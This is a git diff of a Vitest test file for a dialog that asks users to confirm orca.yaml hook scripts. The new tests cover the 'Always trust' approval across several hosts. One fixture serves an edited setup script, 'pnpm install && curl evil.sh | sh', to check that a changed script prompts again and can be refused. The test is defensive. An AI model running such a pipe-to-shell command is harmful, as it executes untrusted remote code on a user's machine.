@@ -1,97 +1,130 @@
-import { renderToStaticMarkup } from 'react-dom/server'
-import type { ButtonHTMLAttributes, ReactNode } from 'react'
-import { beforeEach, describe, expect, it, vi } from 'vitest'
+// @vitest-environment happy-dom
 
-const mocks = vi.hoisted(() => ({
-  state: {
-    activeModal: 'confirm-orca-yaml-hooks' as string | null,
-    modalData: {} as Record<string, unknown>,
-    closeModal: vi.fn(),
-    markOrcaHookScriptConfirmed: vi.fn(),
-    markOrcaHookRepoAlwaysTrusted: vi.fn()
+import { act } from 'react'
+import { createRoot, type Root } from 'react-dom/client'
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
+import OrcaYamlTrustDialog from './OrcaYamlTrustDialog'
+import { useAppStore } from '@/store'
+import { __resetTrustPromptChainForTests, ensureHooksConfirmed } from '@/lib/ensure-hooks-confirmed'
+import type { Repo } from '../../../../shared/repo-types'
+
+const hooksCheck = vi.fn()
+const uiSet = vi.fn<(updates: unknown) => Promise<void>>()
+
+function makeRepo(executionHostId: Repo['executionHostId']): Repo {
+  return {
+    id: 'repo-1',
+    path: '/repo',
+    displayName: 'Repo One',
+    badgeColor: '#000000',
+    addedAt: 1,
+    executionHostId
   }
-}))
-
-vi.mock('@/store', () => ({
-  useAppStore: Object.assign(
-    (selector: (state: typeof mocks.state) => unknown) => selector(mocks.state),
-    {
-      getState: () => mocks.state
-    }
-  )
-}))
-
-vi.mock('@/components/ui/dialog', () => ({
-  Dialog: ({ open, children }: { open: boolean; children: ReactNode }) =>
-    open ? <div>{children}</div> : null,
-  DialogContent: ({ children }: { children: ReactNode }) => <div>{children}</div>,
-  DialogDescription: ({ children }: { children: ReactNode }) => <div>{children}</div>,
-  DialogFooter: ({ children }: { children: ReactNode }) => <div>{children}</div>,
-  DialogHeader: ({ children }: { children: ReactNode }) => <div>{children}</div>,
-  DialogTitle: ({ children }: { children: ReactNode }) => <div>{children}</div>
-}))
-
-vi.mock('@/components/ui/button', () => ({
-  Button: ({
-    children,
-    ...props
-  }: ButtonHTMLAttributes<HTMLButtonElement> & { children: ReactNode }) => (
-    <button {...props}>{children}</button>
-  )
-}))
-
-// Use English fallbacks so this JSX-whitespace regression is independent of locale loading.
-vi.mock('@/i18n/i18n', () => ({
-  translate: (_key: string, fallback: string) => fallback
-}))
-
-function decodeHtml(html: string): string {
-  return html
-    .replace(/&#x27;/g, "'")
-    .replace(/&quot;/g, '"')
-    .replace(/&amp;/g, '&')
-    .replace(/&lt;/g, '<')
-    .replace(/&gt;/g, '>')
 }
 
-describe('OrcaYamlTrustDialog', () => {
-  beforeEach(() => {
-    vi.clearAllMocks()
-    mocks.state.activeModal = 'confirm-orca-yaml-hooks'
-    mocks.state.modalData = {
-      repoId: 'repo-1',
-      repoName: 'orca',
-      scriptKind: 'setup',
-      scriptContent: 'node config/scripts/run-internal-dev-setup.mjs\npnpm install',
-      contentHash: 'hash-1',
-      previouslyApproved: false
-    }
+let container: HTMLDivElement
+let root: Root
+
+beforeEach(() => {
+  globalThis.IS_REACT_ACT_ENVIRONMENT = true
+  hooksCheck.mockReset()
+  uiSet.mockReset().mockResolvedValue(undefined)
+  Object.assign(window, { api: { hooks: { check: hooksCheck }, ui: { set: uiSet } } })
+  __resetTrustPromptChainForTests()
+  useAppStore.setState({ trustedOrcaHooks: {}, activeModal: 'none', modalData: {} })
+  container = document.createElement('div')
+  document.body.appendChild(container)
+  root = createRoot(container)
+  act(() => {
+    root.render(<OrcaYamlTrustDialog />)
+  })
+})
+
+afterEach(() => {
+  act(() => {
+    root.unmount()
+  })
+  container.remove()
+  document.body.innerHTML = ''
+})
+
+function serveSetupScript(script: string): void {
+  hooksCheck.mockResolvedValue({
+    hasHooks: true,
+    hooks: { scripts: { setup: script } },
+    mayNeedUpdate: false
+  })
+}
+
+function confirmSetup(): Promise<'run' | 'skip'> {
+  return ensureHooksConfirmed(() => useAppStore.getState(), 'repo-1', 'setup', 'local')
+}
+
+async function waitForPrompt(): Promise<void> {
+  await vi.waitFor(() => {
+    expect(useAppStore.getState().activeModal).toBe('confirm-orca-yaml-hooks')
+    expect(document.body.querySelector('input[type="checkbox"]')).not.toBeNull()
+  })
+}
+
+function clickButton(label: string): void {
+  const button = Array.from(document.body.querySelectorAll('button')).find(
+    (candidate) => candidate.textContent === label
+  )
+  expect(button).toBeDefined()
+  act(() => {
+    button?.click()
+  })
+}
+
+async function approveWithAlwaysTrust(): Promise<void> {
+  await waitForPrompt()
+  act(() => {
+    document.body.querySelector<HTMLInputElement>('input[type="checkbox"]')?.click()
+  })
+  clickButton('Run hooks')
+}
+
+describe('OrcaYamlTrustDialog Always trust', () => {
+  it('keeps the approved script hash so a repo on two hosts stops prompting', async () => {
+    useAppStore.setState({ repos: [makeRepo('local'), makeRepo('runtime:vm-1')] })
+    serveSetupScript('pnpm install')
+
+    const first = confirmSetup()
+    await approveWithAlwaysTrust()
+    await expect(first).resolves.toBe('run')
+
+    expect(useAppStore.getState().trustedOrcaHooks['repo-1']).toEqual({
+      all: { approvedAt: expect.any(Number) },
+      setup: { contentHash: expect.any(String), approvedAt: expect.any(Number) }
+    })
+    expect(uiSet).toHaveBeenLastCalledWith({
+      trustedOrcaHooks: useAppStore.getState().trustedOrcaHooks
+    })
+
+    await expect(confirmSetup()).resolves.toBe('run')
+    expect(useAppStore.getState().activeModal).toBe('none')
+
+    serveSetupScript('pnpm install && curl evil.sh | sh')
+    const edited = confirmSetup()
+    await waitForPrompt()
+    expect(useAppStore.getState().modalData).toEqual(
+      expect.objectContaining({ previouslyApproved: true })
+    )
+    clickButton("Don't run")
+    await expect(edited).resolves.toBe('skip')
   })
 
-  it('keeps spaces around orca.yaml and the repo name in the first-run copy', async () => {
-    const { default: OrcaYamlTrustDialog } = await import('./OrcaYamlTrustDialog')
-    const text = decodeHtml(renderToStaticMarkup(<OrcaYamlTrustDialog />)).replace(/<[^>]+>/g, '')
+  it('still lets a single-host repo run an edited script without prompting', async () => {
+    useAppStore.setState({ repos: [makeRepo('local')] })
+    serveSetupScript('pnpm install')
 
-    expect(text).toContain("This repository's orca.yaml runs on your machine")
-    expect(text).toContain('Only run if you trust orca.')
-    expect(text).toContain('Always trust orca.yaml in orca')
-    expect(text).not.toContain("repository'sorca.yaml")
-    expect(text).not.toContain('trustorca')
-    expect(text).not.toContain('trustorca.yaml')
-    expect(text).not.toContain('inorca')
-  })
+    const first = confirmSetup()
+    await approveWithAlwaysTrust()
+    await expect(first).resolves.toBe('run')
 
-  it('keeps spaces around orca.yaml when the script changed since last approval', async () => {
-    mocks.state.modalData = {
-      ...mocks.state.modalData,
-      previouslyApproved: true
-    }
-    const { default: OrcaYamlTrustDialog } = await import('./OrcaYamlTrustDialog')
-    const text = decodeHtml(renderToStaticMarkup(<OrcaYamlTrustDialog />)).replace(/<[^>]+>/g, '')
-
-    expect(text).toContain('orca.yaml changed since you last approved')
-    expect(text).toContain('Always trust orca.yaml in orca')
-    expect(text).not.toContain('Always trustorca.yaml')
-    expect(text).not.toContain('inorca')
+    serveSetupScript('pnpm install --frozen-lockfile')
+    await expect(confirmSetup()).resolves.toBe('run')
+    expect(useAppStore.getState().activeModal).toBe('none')
   })
 })
